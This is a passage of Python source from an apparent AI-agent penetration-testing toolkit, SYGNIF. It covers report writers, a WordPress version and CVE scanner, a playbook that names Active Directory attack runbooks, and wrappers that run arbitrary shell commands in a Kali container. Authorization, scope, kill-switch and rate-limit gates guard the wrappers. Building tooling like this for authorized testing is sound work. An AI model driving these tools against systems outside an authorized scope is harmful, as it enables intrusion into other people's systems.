            "description": description,
            "recommendation": recommendation,
        }
        with open(FINDINGS, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
    except OSError as e:
        return "[finding: could not save: " + str(e) + "]"
    mark = "" if rec["verified"] else "  [SINGLE-SOURCE]"
    return ("recorded finding #" + str(rec["id"]) + " [" + severity + "] '" + title
            + "' (phase " + rec["phase"] + ")" + mark + " -> " + FINDINGS)


def _read_findings() -> list:
    out = []
    try:
        with open(FINDINGS, encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if line:
                    try:
                        out.append(json.loads(line))
                    except json.JSONDecodeError:
                        continue
    except OSError:
        pass
    return out


def _report_html(findings: list, summary: str, scope_text: str) -> str:
    """Standalone HTML report (stdlib only) built from the structured findings."""
    e = _html.escape
    col = {"critical": "#b00020", "high": "#d84315", "medium": "#f9a825",
           "low": "#2e7d32", "info": "#607d8b"}
    parts = ["<!doctype html><meta charset=utf-8><title>SYGNIF pentest report</title>",
             "<style>body{font:15px/1.5 system-ui,sans-serif;max-width:900px;margin:2rem auto;"
             "padding:0 1rem;color:#111}pre{background:#f4f4f4;padding:.8rem;overflow:auto;"
             "border-radius:6px}h3{margin-top:2rem}.sev{color:#fff;padding:.1rem .5rem;"
             "border-radius:4px;font-size:.8em}.m{color:#666;font-size:.9em}</style>",
             "<h1>SYGNIF pentest report</h1>",
             "<p class=m>Generated " + e(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")) + "</p>"]
    if scope_text:
        parts.append("<h2>Scope</h2><pre>" + e(scope_text.strip()) + "</pre>")
    parts.append("<h2>Summary</h2><p>" + str(len(findings)) + " finding(s): " + e(summary) + "</p>")
    parts.append("<h2>Findings</h2>")
    for f in findings:
        sv = f.get("severity", "info")
        badge = "<span class=sev style='background:" + col.get(sv, "#607d8b") + "'>" + e(sv.upper()) + "</span>"
        parts.append("<h3>#" + str(f.get("id")) + " " + badge + " " + e(f.get("title", "")) + "</h3>")
        vmark = "" if f.get("verified", True) else " <span class=m>[single-source]</span>"
        parts.append("<p class=m>Target: " + e(f.get("target", "")) + " &middot; Phase: "
                     + e(f.get("phase", "")) + " &middot; " + e(f.get("ts", "")) + vmark + "</p>")
        if f.get("description"):
            parts.append("<p>" + e(f["description"]) + "</p>")
        parts.append("<p><b>Evidence</b></p><pre>" + e(f.get("evidence", "").rstrip()) + "</pre>")
        if f.get("verify"):
            parts.append("<p><b>Corroboration</b></p><pre>" + e(f.get("verify", "").rstrip()) + "</pre>")
        if f.get("recommendation"):
            parts.append("<p><b>Recommendation:</b> " + e(f["recommendation"]) + "</p>")
    return "\n".join(parts) + "\n"


def tool_report(args: dict) -> str:
    """Render all recorded findings into a Markdown pentest report in the
    workspace, grouped by severity (critical first), each with its evidence,
    phase, and recommendation. Pulls the engagement header from SCOPE.md when
    present. Call this at the end, or any time for a running picture."""
    findings = _read_findings()
    if not findings:
        return ("no findings recorded yet — nothing to report. Use the 'finding' tool "
                "as you confirm issues, then run 'report'.")
    order = {s: i for i, s in enumerate(reversed(SEVERITIES))}  # critical=0 .. info=4
    findings.sort(key=lambda f: (order.get(f.get("severity", "info"), 99), f.get("id", 0)))

    lines = ["# SYGNIF pentest report",
             "",
             "_Generated " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "_",
             ""]
    scope = os.path.join(WORKSPACE, "SCOPE.md")
    if os.path.exists(scope):
        try:
            lines += ["## Scope", "", open(scope, encoding="utf-8").read().strip(), ""]
        except OSError:
            pass

    counts = {}
    for f in findings:
        counts[f.get("severity", "info")] = counts.get(f.get("severity", "info"), 0) + 1
    summary = ", ".join(str(counts[s]) + " " + s for s in reversed(SEVERITIES) if s in counts)
    lines += ["## Summary", "", str(len(findings)) + " finding(s): " + summary, ""]

    lines += ["## Findings", ""]
    for f in findings:
        lines.append("### #" + str(f.get("id")) + " [" + f.get("severity", "?").upper() + "] " + f.get("title", ""))
        lines.append("")
        lines.append("- **Target:** " + f.get("target", ""))
        lines.append("- **Phase:** " + f.get("phase", "") + "   **Found:** " + f.get("ts", ""))
        if f.get("description"):
            lines += ["", f["description"]]
        lines += ["", "**Evidence:**", "", "```", f.get("evidence", "").rstrip(), "```"]
        if f.get("recommendation"):
            lines += ["", "**Recommendation:** " + f["recommendation"]]
        lines += ["", "---", ""]

    scope_text = ""
    if os.path.exists(scope):
        try:
            scope_text = open(scope, encoding="utf-8").read()
        except OSError:
            pass
    html_file = os.path.splitext(REPORT_FILE)[0] + ".html"
    written = []
    try:
        os.makedirs(WORKSPACE, exist_ok=True)
        with open(REPORT_FILE, "w", encoding="utf-8") as fh:
            fh.write("\n".join(lines) + "\n")
        written.append(REPORT_FILE)
        with open(html_file, "w", encoding="utf-8") as fh:
            fh.write(_report_html(findings, summary, scope_text))
        written.append(html_file)
    except OSError as e:
        return "[report: could not write: " + str(e) + "]"
    # optional PDF via whatever is present; skipped silently if neither is (zero-dep principle)
    pdf_file = os.path.splitext(REPORT_FILE)[0] + ".pdf"
    if _run_host("command -v weasyprint", 10)[1] == 0:
        if _run_host("weasyprint " + shlex.quote(html_file) + " " + shlex.quote(pdf_file), 120)[1] == 0:
            written.append(pdf_file)
    elif _run_host("command -v pandoc", 10)[1] == 0:
        if _run_host("pandoc " + shlex.quote(REPORT_FILE) + " -o " + shlex.quote(pdf_file), 120)[1] == 0:
            written.append(pdf_file)
    return ("wrote report: " + str(len(findings)) + " finding(s) (" + summary + ") -> "
            + ", ".join(os.path.basename(w) for w in written))


def tool_playbook(args: dict) -> str:
    """Return the offline pentest methodology shipped with the seat — the
    kill-chain checklist and the role modes. Pass section=<phase or role> to get
    just that part (recon|enum|vuln|exploit|exploitdev|postexploit|privesc|report|webapp|wpsec|dast|detect|
    hosting|redteam|network|passwords|cellular|shodan|containers|cloud|crypto|website|api|scout|analyzer|exploiter|reporter| engagement|external|adchain|cloudchain|purpleloop|irchain| attacks|arp|llmnr|kerberoast|asrep|relay|dcsync|esc1|passhash). attacks=* are technique-level attack runbooks; engagement=* are orchestrated tool-chain playbooks per engagement type. No network needed; use this when the van has no signal."""
    section = str(args.get("section", "")).strip().lower()
    path = os.path.join(SEAT_DIR, "methodology.md")
    try:
        text = open(path, encoding="utf-8").read()
    except OSError as e:
        return "[playbook: methodology.md not found: " + str(e) + "]"
    if not section:
        return _truncate(text)
    blocks = []
    keep = False
    for line in text.splitlines():
        if line.startswith("## "):
            # Exact section-word match on the heading's first token, so 'report'
            # does not also drag in 'reporter' (nor 'exploit' -> 'exploiter').
            head_word = line[3:].split()[0].lower() if line[3:].split() else ""
            keep = head_word == section
        if keep:
            blocks.append(line)
    if not blocks:
        return ("no section '" + section + "'. Sections: recon, enum, vuln, exploit, "
                "postexploit, privesc, report, exploitdev, webapp, wpsec, dast, detect, hosting, redteam, network, passwords, cellular, runbook, chaining, nmap, nuclei, wpscan, ffuf, sqlmap, hydra, hashcat, metasploit, handshake, osint, scout, analyzer, exploiter, "
                "reporter, android, engagement, external, adchain, cloudchain, purpleloop, irchain, attacks, arp, llmnr, kerberoast, asrep, relay, dcsync, esc1, passhash (omit for the whole thing).")
    return _truncate("\n".join(blocks))


def tool_purple(args: dict) -> str:
    """Run a raw DEFENSIVE (blue-team) command — the counterpart of the 'kali'
    tool. Runs in the purple container if present, else the offensive toolbox,
    else the host. Detection / IR / forensics / log analysis with whatever the
    container provides (commonly yara, clamav, rkhunter, chkrootkit, chainsaw;
    more if a full Kali-Purple image is used). For structured compromise
    assessment prefer the 'detect' tool. Analysis and hardening, not attacking."""
    import shlex
    command = str(args.get("command", "")).strip()
    if not command:
        return ("purple: ERROR — no 'command' was given, so NOTHING ran and you have\n"
                "observed NOTHING. Reissue with a real command; do NOT answer from memory.")
    # portable: purple container if present, else the offensive toolbox, else host
    box = _def_container()
    if box:
        out, rc = _run_host(
            "docker exec " + shlex.quote(box) + " bash -lc " + shlex.quote(command), KALI_TIMEOUT)
        where = "docker:" + box
    elif not _IS_WINDOWS:
        out, rc = _run_host("bash -lc " + shlex.quote(command), KALI_TIMEOUT)
        where = "host"
    else:
        return "purple: no purple container, toolbox, or POSIX host available for defensive commands."
    return _truncate(out) + "\nexit=" + str(rc) + "  (via " + where + ")"


def tool_kali(args: dict) -> str:
    """Run a pentest command with the Kali toolset. Prefers the `sygnif-kali`
    Docker container (same as the pi seat) when Docker + the container are
    available; otherwise runs directly on this host (a native Kali box already
    has the tools). Grounds every result in real output."""
    command = str(args.get("command", "")).strip()
    if not command:
        return ("kali: ERROR — no 'command' was given, so NOTHING ran and you have\n"
                "observed NOTHING. Reissue with a real command; do NOT answer from memory.")
    container = _toolbox_name(auto_create=True) or TOOLBOX_NAME
    have_docker = not _IS_WINDOWS and _run_host("command -v docker", 10)[1] == 0
    if have_docker:
        state, _ = _run_host(
            f"docker inspect -f '{{{{.State.Status}}}}' {container} 2>/dev/null", 10
        )
        state = state.strip()
        if state and state != "running":
            # Container exists but is stopped — bring it up so the toolset is usable.
            _run_host(f"docker start {container}", 60)
            state, _ = _run_host(
                f"docker inspect -f '{{{{.State.Status}}}}' {container} 2>/dev/null", 10
            )
            state = state.strip()
        if state == "running":
            import shlex
            out, rc = _run_host(f"docker exec {container} bash -lc {shlex.quote(command)}", KALI_TIMEOUT)
            # Punkt 5 — Fehler-Wiederholung: ein Timeout ist oft ein zu langer
            # erster Scan oder eine Lastspitze, kein echter Fehlschlag. Genau
            # einmal mit halbem Zeitbudget nachfassen und beide Laeufe kenntlich
            # machen, statt dem Modell ein abgeschnittenes Nicht-Ergebnis zu geben.
            if rc == 124:
                out2, rc2 = _run_host(
                    f"docker exec {container} bash -lc {shlex.quote(command)}",
                    max(60, KALI_TIMEOUT // 2))
                if rc2 != 124:
                    return (_truncate(out2)
                            + f"\nexit={rc2}  (via docker:{container}; retried after a timeout)")
                return (_truncate(out2)
                        + f"\nexit={rc2}  (via docker:{container}; timed out twice — "
                        f"narrow the scan, raise SYGNIF_PY_KALI_TIMEOUT, or split the target)")
            return _truncate(out) + f"\nexit={rc}  (via docker:{container})"
    # No container — run on host (a native Kali box has the tools).
    out, rc = _run_host(command, KALI_TIMEOUT)
    hint = "" if _run_host("command -v nmap", 5)[1] == 0 else \
        f"  [no '{container}' container and Kali tools not on PATH — run `sygnif kali-setup` to provision the full toolset]"
    return _truncate(out) + f"\nexit={rc}  (on host){hint}"


# --- WordPress plugin/theme vulnerability scanning --------------------------
# Two grounded tools for the webdev preset:
#   wp_vulnscan  — detect a site's WordPress core/plugins/themes + versions
#                  (passive HTTP), flag out-of-date components, and (with a
#                  WPScan token, or cves=true for keyless NVD) list known CVEs.
#   vuln_check   — the known-vulnerability tester: look up CVEs for a given
#                  product+version or a specific CVE id.
# Data sources, in order of quality: the WPScan API (needs WPSCAN_API_TOKEN,
# free tier at wpscan.com/api — exact affected-version ranges), else keyless
# NVD keyword search (rich but version matching is best-effort) plus the keyless
# WordPress.org plugin API for the latest-version / out-of-date signal.
_BROWSER_UA = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
NVD_CVE_API = "https://services.nvd.nist.gov/rest/json/cves/2.0"
WPORG_PLUGIN_API = "https://api.wordpress.org/plugins/info/1.0/{slug}.json"
WPSCAN_API_TOKEN = os.environ.get("WPSCAN_API_TOKEN", "").strip()
WPVULN_MAX = int(os.environ.get("SYGNIF_PY_WPVULN_MAX", "25"))


def _wp_fetch(url: str) -> tuple[str, int, str]:
    return _http_get(url, headers={"User-Agent": _BROWSER_UA,
                                   "Accept-Language": "en,de;q=0.8"})


def _norm_url(u: str) -> str:
    u = (u or "").strip()
    if not u:
        return ""
    if not u.startswith(("http://", "https://")):
        u = "https://" + u
    return u.rstrip("/")


def _plugin_latest(slug: str) -> str:
    """Latest published version from the keyless WordPress.org plugin API."""
    body, status, _ = _wp_fetch(WPORG_PLUGIN_API.format(slug=slug))
    if status == 200 and body:
        try:
            v = json.loads(body).get("version")
            if isinstance(v, str):
                return v
        except Exception:  # noqa: BLE001
            pass
    return ""


def _readme_stable(base: str, slug: str) -> str:
    """Installed plugin version from its readme.txt 'Stable tag', if reachable."""
    body, status, _ = _wp_fetch(f"{base}/wp-content/plugins/{slug}/readme.txt")
    if status == 200 and body:
        m = re.search(r"(?im)^\s*Stable tag:\s*([0-9][0-9A-Za-z.\-]*)", body)
        if m:
            return m.group(1)
    return ""


def _detect_wp(url: str) -> dict:
    """Passively enumerate WordPress core, plugins and themes with versions.

    Version source per plugin/theme: the `?ver=` on its asset URLs in the page
    (usually the real installed version), else its readme.txt / style.css.
    """
    base = _norm_url(url)
    home, status, err = _wp_fetch(base + "/")
    out = {"base": base, "is_wp": False, "core": "", "plugins": {}, "themes": {},
           "status": status, "error": err}
    if status != 200 or not home:
        # try /readme.html and /wp-login.php as secondary signals
        rl, rs, _ = _wp_fetch(base + "/wp-login.php")
        if rs != 200:
            return out
        home = rl
    blob = home
    # core version
    m = re.search(r'name=["\']generator["\']\s+content=["\']WordPress\s+([0-9.]+)', blob, re.I)
    if not m:
        rh, rs, _ = _wp_fetch(base + "/readme.html")
        if rs == 200:
            m = re.search(r'Version\s+([0-9.]+)', rh)
    if m:
        out["core"] = m.group(1)
    # plugins: slug + optional ?ver=
    for slug, ver in re.findall(
            r'/wp-content/plugins/([a-zA-Z0-9\-_]+)/[^"\'?]*(?:\?[^"\']*?ver=([0-9][0-9.]*))?',
            blob):
        out.setdefault("plugins", {})
        cur = out["plugins"].get(slug, "")
        if ver and not cur:
            out["plugins"][slug] = ver
        else:
            out["plugins"].setdefault(slug, cur)
    # themes: slug (version from style.css later)
    for slug in set(re.findall(r'/wp-content/themes/([a-zA-Z0-9\-_]+)/', blob)):
        out["themes"].setdefault(slug, "")
    out["is_wp"] = bool(out["core"] or out["plugins"] or out["themes"]
                        or "/wp-content/" in blob or "wp-json" in blob)
    # fill missing plugin versions from readme.txt (authoritative Stable tag)
    for slug in list(out["plugins"]):
        if not out["plugins"][slug]:
            out["plugins"][slug] = _readme_stable(base, slug)
    # theme versions from style.css
    for slug in list(out["themes"]):
        css, cs, _ = _wp_fetch(f"{base}/wp-content/themes/{slug}/style.css")
        if cs == 200:
            tm = re.search(r"(?im)^\s*Version:\s*([0-9][0-9A-Za-z.\-]*)", css)
            if tm:
                out["themes"][slug] = tm.group(1)
    return out


def _wpscan_lookup(kind: str, slug: str) -> list | None:
    """WPScan API v3 vulnerabilities for a plugin/theme slug. None if no token."""
    if not WPSCAN_API_TOKEN:
        return None
    body, status, _ = _http_get(
        f"https://wpscan.com/api/v3/{kind}/{slug}",
        headers={"Authorization": f"Token token={WPSCAN_API_TOKEN}"})
    if status != 200 or not body:
        return []
    try:
        data = json.loads(body).get(slug, {})
        vulns = []
        for v in data.get("vulnerabilities", []) or []:
            cves = (v.get("references", {}) or {}).get("cve", []) or []
            vulns.append({
                "title": v.get("title", ""),
                "cve": ", ".join("CVE-" + c for c in cves) if cves else "",
                "fixed_in": v.get("fixed_in") or "?",
            })
        return vulns
    except Exception:  # noqa: BLE001
        return []


def _nvd_lookup(keyword: str, limit: int = 5, cve_id: str = "") -> list:
    """Keyless NVD lookup by keyword or exact CVE id. Best-effort, never raises."""
    if cve_id:
        q = f"{NVD_CVE_API}?cveId={cve_id}"
    else:
        q = (f"{NVD_CVE_API}?keywordSearch={urllib.parse.quote(keyword)}"
             f"&resultsPerPage={limit}")
    body, status, _ = _http_get(q, headers={"User-Agent": _BROWSER_UA})
    if status != 200 or not body:
        return []
    try:
        d = json.loads(body)
    except Exception:  # noqa: BLE001
        return []
    out = []
    for item in d.get("vulnerabilities", [])[:max(limit, 1)]:
        c = item.get("cve", {})
        score = ""
        metrics = c.get("metrics", {}) or {}
        for k in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
            if metrics.get(k):
                score = metrics[k][0].get("cvssData", {}).get("baseScore", "")
                break
        desc = ""
        for dd in c.get("descriptions", []):
            if dd.get("lang") == "en":
                desc = dd.get("value", "")
                break
        out.append({"cve": c.get("id", ""), "cvss": score,
                    "published": (c.get("published", "") or "")[:10],
                    "desc": " ".join(desc.split())[:160]})
    return out


def tool_wp_vulnscan(args: dict) -> str:
    """Detect a WordPress site's components and flag outdated / vulnerable ones."""
    url = _norm_url(str(args.get("url", "")))
    if not url:
        return "wp_vulnscan: give a 'url' (a site you own or are authorized to test)."
    want_cves = str(args.get("cves", "")).lower() in ("1", "true", "yes") or bool(WPSCAN_API_TOKEN)
    det = _detect_wp(url)
    if det.get("error") and not det.get("is_wp"):
        return f"wp_vulnscan: could not reach {url} ({det['error']})."
    if not det.get("is_wp"):
        return (f"wp_vulnscan: {url} does not look like WordPress "
                f"(no wp-content/wp-json/generator signals). Nothing to enumerate.")
    lines = [f"WordPress scan of {url}"]
    if det["core"]:
        lines.append(f"  core: WordPress {det['core']}")
        if want_cves:
            for v in _nvd_lookup(f"wordpress {det['core']}", 3):
                lines.append(f"    CVE {v['cve']} (cvss {v['cvss']}): {v['desc']}")
    comps = ([("plugins", s, v) for s, v in det["plugins"].items()]
             + [("themes", s, v) for s, v in det["themes"].items()])
    if not comps:
        lines.append("  no plugins/themes detected from the homepage (try an authenticated "
                     "scan or wpscan for depth).")
    flagged = 0
    for kind, slug, ver in comps[:WPVULN_MAX]:
        latest = _plugin_latest(slug) if kind == "plugins" else ""
        outdated = bool(ver and latest and ver != latest)
        tag = f"{kind[:-1]} {slug}"
        vtxt = f"v{ver}" if ver else "version?"
        parts = [f"  {tag}: {vtxt}"]
        if latest:
            parts.append(f"(latest {latest}{' — OUTDATED' if outdated else ''})")
        lines.append(" ".join(parts))
        if outdated:
            flagged += 1
        if want_cves:
            wp = _wpscan_lookup(kind, slug)
            if wp is not None:
                for v in wp:
                    lines.append(f"      VULN {v['title']} [{v['cve']}] fixed in {v['fixed_in']}")
                    flagged += 1
            else:
                for v in _nvd_lookup(slug.replace("-", " "), 3):
                    lines.append(f"      CVE {v['cve']} (cvss {v['cvss']}): {v['desc']}")
    if len(comps) > WPVULN_MAX:
        lines.append(f"  ... {len(comps) - WPVULN_MAX} more (raise SYGNIF_PY_WPVULN_MAX)")
    src = ("WPScan API (token set)" if WPSCAN_API_TOKEN
           else ("keyless NVD keyword + WordPress.org latest-version" if want_cves
                 else "outdated-check only — pass cves=true or set WPSCAN_API_TOKEN for CVE matching"))
    lines.append(f"  [source: {src}. Verify each hit; version detection is passive and "
                 f"can be masked. Only scan sites you are authorized to test.]")
    if flagged:
        lines.insert(1, f"  ⚠ {flagged} outdated/vulnerable signal(s) — see below.")
    return _truncate("\n".join(lines))


def tool_vuln_check(args: dict) -> str:
    """Known-vulnerability tester: CVEs for a product+version, a WP slug, or a CVE id."""
    cve = str(args.get("cve", "")).strip().upper()
    product = str(args.get("product", "") or args.get("slug", "")).strip()
    version = str(args.get("version", "")).strip()
    kind = str(args.get("kind", "plugins")).strip() or "plugins"
    if cve:
        hits = _nvd_lookup("", cve_id=cve)
        if not hits:
            return f"vuln_check: no NVD record for {cve} (check the id)."
        v = hits[0]
        return (f"{v['cve']}  cvss {v['cvss']}  published {v['published']}\n{v['desc']}\n"
                f"[source: NVD. Confirm applicability to your exact version.]")
    if not product:
        return ("vuln_check: give a 'product' (or 'slug'), optional 'version'; or a 'cve' id. "
                "e.g. {product:'elementor', version:'3.5.0'} or {cve:'CVE-2024-...'}")
    # WP slug via WPScan when a token is set (exact affected ranges)
    wp = _wpscan_lookup(kind, product) if WPSCAN_API_TOKEN else None
    if wp is not None:
        if not wp:
            return f"vuln_check: WPScan lists no known vulnerabilities for {kind[:-1]} '{product}'."
        out = [f"Known vulnerabilities for {kind[:-1]} '{product}' (WPScan):"]
        for v in wp:
            out.append(f"  {v['title']} [{v['cve']}] fixed in {v['fixed_in']}")
        return _truncate("\n".join(out))
    kw = f"{product} {version}".strip()
    hits = _nvd_lookup(kw, 8)
    if not hits:
        return (f"vuln_check: NVD returned nothing for '{kw}'. Try the plain product name, "
                f"or set WPSCAN_API_TOKEN for WordPress plugin/theme coverage.")
    out = [f"NVD matches for '{kw}' (keyless keyword search — verify each applies to your version):"]
    for v in hits:
        out.append(f"  {v['cve']} (cvss {v['cvss']}, {v['published']}): {v['desc']}")
    return _truncate("\n".join(out))



# --- Offensive capability tools (AUTHORIZED ENGAGEMENTS ONLY) ----------------
# Structured wrappers around the standard full-power pentest binaries. Every tool
# here REQUIRES two things from the operator and refuses without them:
#   target        — a single named host / domain / URL / interface (never a mass sweep)
#   authorization — a short attestation of who authorized testing that target
# When ~/sygnif-pentest/SCOPE.md lists in-scope hosts, the target must match one.
# Deliberately NOT built: C2 / persistence, detection-evasion, or mass targeting.
# Tools shell out to the sygnif-kali container when present, else the host, so
# they work on a Kali box or a plain Linux install alike.
import shlex

OFFENSIVE_TIMEOUT = int(os.environ.get("SYGNIF_PY_OFFENSIVE_TIMEOUT", "1800"))
SCOPE_FILE = os.path.expanduser(os.environ.get("SYGNIF_PY_SCOPE_FILE", "~/sygnif-pentest/SCOPE.md"))
# --- self-contained Docker toolbox ------------------------------------------
# sygnif-py OWNS its pentest toolbox so the offensive/network tools depend on
# nothing pre-existing. It ADOPTS an already-present container (env override,
# then sygnif-py-toolbox, then legacy sygnif-kali), else self-provisions
# sygnif-py-toolbox from the Kali image. Host is the fallback when Docker is absent.
TOOLBOX_IMAGE = os.environ.get("SYGNIF_PY_KALI_IMAGE", "kalilinux/kali-rolling")
TOOLBOX_NAME = os.environ.get("SYGNIF_PY_KALI_CONTAINER", "sygnif-py-toolbox")
_TOOLBOX_CANDIDATES = list(dict.fromkeys([TOOLBOX_NAME, "sygnif-py-toolbox", "sygnif-kali"]))


def _docker_ok() -> bool:
    return not _IS_WINDOWS and _run_host("command -v docker", 10)[1] == 0


def _container_state(name: str) -> str:
    out, rc = _run_host("docker inspect -f '{{.State.Status}}' " + shlex.quote(name) + " 2>/dev/null", 10)
    return out.strip() if rc == 0 else ""


def _toolbox_name(auto_create: bool = False) -> str:
    """Resolve a usable toolbox container name, or '' for host-only.

    Adopts an existing candidate (starting it if stopped). With auto_create,
    provisions sygnif-py-toolbox from the Kali image when none exists and Docker
    is available (one-time base-image pull)."""
    if not _docker_ok():
        return ""
    for name in _TOOLBOX_CANDIDATES:
        st = _container_state(name)
        if st == "running":
            return name
        if st in ("exited", "created", "paused"):
            _run_host("docker start " + shlex.quote(name), 60)
            if _container_state(name) == "running":
                return name
    if not auto_create:
        return ""
    _run_host("docker run -d --name " + shlex.quote(TOOLBOX_NAME) + " --restart unless-stopped "
              "--network host --cap-add=NET_ADMIN --cap-add=NET_RAW " + shlex.quote(TOOLBOX_IMAGE)
              + " sleep infinity", 900)
    return TOOLBOX_NAME if _container_state(TOOLBOX_NAME) == "running" else ""


_KALI_CONTAINER = TOOLBOX_NAME


def _scope_targets() -> set | None:
    """In-scope hosts parsed from SCOPE.md, or None if the file is absent/empty."""
    try:
        txt = open(SCOPE_FILE, encoding="utf-8").read()
    except OSError:
        return None
    found = set(re.findall(r"\b(?:\d{1,3}(?:\.\d{1,3}){3}|[a-z0-9][a-z0-9.\-]*\.[a-z]{2,})\b",
                           txt, re.I))
    # drop the boilerplate example/label tokens the template ships with
    found = {f.lower() for f in found if f.lower() not in ("hosts.ips.urls", "e.g")}
    return found or None


def _scope_networks() -> list:
    """CIDR networks parsed from SCOPE.md, for range-based authorization.

    Lets a scope line like `10.1.1.0/24` authorize any host inside it, instead of
    only the exact network address. IPv4 and IPv6 CIDRs are accepted."""
    try:
        txt = open(SCOPE_FILE, encoding="utf-8").read()
    except OSError:
        return []
    nets = []
    for m in re.findall(r"\b[0-9a-fA-F:.]+/\d{1,3}\b", txt):
        try:
            nets.append(ipaddress.ip_network(m, strict=False))
        except ValueError:
            pass
    return nets


def _bare_host(target: str) -> str:
    t = str(target).strip()
    t = re.sub(r"^\w+://", "", t)
    return t.split("/")[0].split(":")[0].lower()


# --- blast-radius guards (review P2-7): kill-switch, mass-target, rate-limit ----
STOP_FILE = os.path.expanduser(os.environ.get("SYGNIF_PY_STOP_FILE", "~/sygnif-pentest/STOP"))
RATE_FILE = os.path.join(WORKSPACE, ".offensive_rate")
MAX_OFF_CALLS = int(os.environ.get("SYGNIF_PY_MAX_OFF_CALLS", "40"))
RATE_WINDOW = int(os.environ.get("SYGNIF_PY_RATE_WINDOW", "60"))
MAX_RANGE_HOSTS = int(os.environ.get("SYGNIF_PY_MAX_RANGE_HOSTS", "256"))


def _blast_guard(args: dict, target: str) -> str | None:
    """Hard guards, in order: (1) a STOP kill-switch file halts every offensive tool;
    (2) a wildcard or an over-broad CIDR is refused as mass targeting; (3) a rate
    limit throttles a runaway offensive loop. Returns a refusal string, or None."""
    if os.path.exists(STOP_FILE):
        return ("REFUSED: kill-switch active — " + STOP_FILE + " exists. Every offensive tool "
                "is halted. Delete that file to resume.")
    raw = str(target).strip()
    if "*" in raw:
        return "REFUSED: wildcard target. Name a single host; mass targeting is not permitted."
    cidr = re.match(r"^\d{1,3}(?:\.\d{1,3}){3}/\d{1,2}$", raw)
    if cidr:
        try:
            net = ipaddress.ip_network(raw, strict=False)
            if net.num_addresses > MAX_RANGE_HOSTS and not str(args.get("allow_range", "")).strip():
                return ("REFUSED: '" + raw + "' spans " + str(net.num_addresses) + " hosts (cap "
                        + str(MAX_RANGE_HOSTS) + "). Mass targeting is off by default — narrow the "
                        "range, or pass allow_range=<reason> if the engagement authorizes the block.")
        except ValueError:
            pass
    now = time.time()
    try:
        hits = []
        if os.path.exists(RATE_FILE):
            hits = [float(x) for x in open(RATE_FILE).read().split() if x]
        hits = [h for h in hits if now - h < RATE_WINDOW]
        if len(hits) >= MAX_OFF_CALLS:
            return ("REFUSED: rate limit — " + str(len(hits)) + " offensive calls in the last "
                    + str(RATE_WINDOW) + "s (cap " + str(MAX_OFF_CALLS) + "). This guards against a "
                    "runaway scan. Wait, or raise SYGNIF_PY_MAX_OFF_CALLS for this engagement.")
        hits.append(now)
        os.makedirs(WORKSPACE, exist_ok=True)
        with open(RATE_FILE, "w") as fh:
            fh.write(" ".join(str(h) for h in hits[-MAX_OFF_CALLS * 2:]))
    except OSError:
        pass
    return None


def _authz(args: dict, target: str) -> str | None:
    """Authorization gate. Returns a refusal string, or None when cleared."""
    if not target:
        return "REFUSED: no 'target' given (a single host / domain / URL / interface)."
    bg = _blast_guard(args, target)
    if bg:
        return bg
    auth = str(args.get("authorization", "") or args.get("auth", "")).strip()
    if len(auth) < 6:
        return ("REFUSED: set 'authorization' — a short attestation that you are authorized to "
                f"test '{target}' (owner / engagement / ticket). Authorized targets only; this "
                "tool will not run without it.")
    scoped = _scope_targets()
    nets = _scope_networks()
    if scoped or nets:
        t = _bare_host(target)
        ok = bool(scoped) and any(t == s or t.endswith("." + s) for s in scoped)
        if not ok and nets:
            try:
                ip = ipaddress.ip_address(t)
                ok = any(ip in n for n in nets)
            except ValueError:
                pass  # target is a hostname, not an IP — networks can't match it
        if not ok:
            in_scope = ", ".join(sorted(scoped)) if scoped else ""
            net_s = ("; nets: " + ", ".join(str(n) for n in nets)) if nets else ""
            return (f"REFUSED: '{t}' is not in SCOPE.md. In scope: "
                    f"{in_scope[:200]}{net_s}. Add it to your authorized scope first.")
    return None


def _off_run(command: str, timeout: int | None = None,
             need=None, pipefail: bool = False) -> tuple[str, int, str]:
    """Run a command in sygnif-py's Docker toolbox if available, else on the host.

    need=    binaries the command requires (str or list). If any are absent the
             command is NOT run and a clear 'missing tool' string is returned with
             rc 127 — so a missing tool never masquerades as an empty (clean) result.
    pipefail run under `set -o pipefail` so a failing stage in a pipe is not hidden
             by a succeeding tail. Off by default: a trailing head/tail would turn a
             normal SIGPIPE into a non-zero exit, so enable it only for head-free pipes."""
    timeout = timeout or OFFENSIVE_TIMEOUT
    if need:
        miss = _need(need)
        if miss:
            return miss, 127, "preflight"
    if pipefail:
        command = "set -o pipefail; " + command
    box = _toolbox_name(auto_create=False)
    if box:
        out, rc = _run_host("docker exec " + shlex.quote(box) + " bash -lc " + shlex.quote(command), timeout)
        return out, rc, f"docker:{box}"
    out, rc = _run_host(command, timeout)
    return out, rc, "host"


def _need(bins) -> str:
    """'' if every binary in `bins` is present in the run context (toolbox or host),
    else a clear message naming the missing ones. One exec, not one per binary."""
    names = [b for b in (bins if isinstance(bins, (list, tuple)) else [bins]) if b]
    if not names:
        return ""
    checks = "; ".join("command -v " + shlex.quote(b) + " >/dev/null 2>&1 || echo MISSING:" + b
                       for b in names)
    out, _rc, where = _off_run(checks, 30)
    missing = sorted({ln.split("MISSING:", 1)[1].strip()
                      for ln in out.splitlines() if ln.startswith("MISSING:")})
    if not missing:
        return ""
    loc = "the toolbox" if where.startswith("docker") else "this host"
    return ("MISSING TOOL(S): " + ", ".join(missing) + " — not installed in " + loc
            + ". Run `sygnif kali-setup` to provision the toolbox, or install them, then retry.")


def _inventory_harvest(title: str, cmd: str, out: str) -> None:
    """Best-effort asset inventory: pull host + open ports/services from an offensive
    tool's real output into hosts.jsonl, deduped by (host, port, proto). Turns the
    recon/enum trail into a queryable target base instead of grep-over-notes (P1-5)."""
    try:
        hm = re.search(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b", cmd) or \
             re.search(r"\b([a-z0-9][a-z0-9.\-]*\.[a-z]{2,})\b", cmd, re.I)
        host = hm.group(1) if hm else ""
        if not host:
            return
        rows = []
        for m in re.finditer(r"(\d{1,5})/(tcp|udp)\s+open\s+(\S+)", out):
            rows.append((int(m.group(1)), m.group(2), m.group(3)))
        if not rows:
            rows = [(None, None, None)]  # host seen, no ports parsed
        existing = set()
        recs = []
        if os.path.exists(INVENTORY):
            for ln in open(INVENTORY, encoding="utf-8"):
                try:
